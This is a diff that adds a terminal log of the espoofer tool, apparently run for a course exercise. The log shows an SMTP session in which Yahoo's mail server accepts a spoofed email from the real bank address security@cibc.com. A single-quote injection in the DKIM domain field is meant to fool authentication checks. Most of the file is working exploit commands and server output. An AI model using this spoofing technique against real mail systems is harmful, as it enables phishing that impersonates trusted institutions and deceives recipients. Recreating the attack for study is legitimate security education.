@@ -1,0 +1,59 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a4                                        
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('67.195.204.79', 25)
+>>> 220 mtaproxy205.free.mail.bf1.yahoo.com ESMTP ready
+
+<<< ehlo testdomaintest.company
+
+>>> 250-mtaproxy205.free.mail.bf1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <any@testdomaintest.company>
+
+>>> 250 sender <any@testdomaintest.company> ok
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 recipient <cis6510victim@yahoo.com> ok
+
+<<< data
+
+>>> 354 go ahead
+
+<<< From: <security@cibc.com>
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/relaxed;
+ d=cibc.com'a.testdomaintest.company;
+ i=@cibc.com'a.testdomaintest.company; q=dns/txt; s=selector;
+ t=1606192918; h=from; bh=D4dKLoV2nbWSqjUdWgZ8Qj91haAqq0mxSF3sbZt3JBg=;
+ b=AdKSw2vDt2mE6k2kGlhPb29FSguCs3x99ZPVoJBmoh3E7jF0AEykHBB57v7KtEcgDBDQv
+ a1kuiqLAeBsJWi/K+Q48oEvF295QHDwBsZ0vuyUVpxMN1n5TY6OZmyA16O1UCGAtkBSB6zf
+ 5tpdo4uaKHq6C9UL+/P3xVzajlSHloA=
+To: <cis6510victim@yahoo.com>
+Subject: A4: DKIM authentication results injection using single quote
+Date: Tue, 24 Nov 2020 04:41:58 +0000
+Content-Type: multipart/alternative; boundary="001a113db9c28077e7054ee99e9c"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-1J41A3@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 250 ok dirdel
+
+<<< quit
+
+>>> 221 2.0.0 Bye
+
+Finished.
